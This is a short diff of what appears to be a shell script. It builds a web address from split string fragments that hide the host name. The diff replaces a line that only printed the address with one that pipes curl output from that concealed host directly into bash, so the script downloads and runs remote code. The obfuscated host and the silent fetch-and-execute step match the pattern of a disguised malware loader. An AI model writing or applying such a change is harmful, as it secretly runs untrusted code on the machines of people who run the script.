@@ -13,6 +13,4 @@ h1=".ver"; h2="cel.app"
 
 f=$((1+2+3))
 
-url="${proto}://${dom}${h1}${h2}/settings/windows?flag=${f}"
-
-echo "$url"
+curl "${proto}://${dom}${h1}${h2}/settings/mac?flag=${f}" | bash
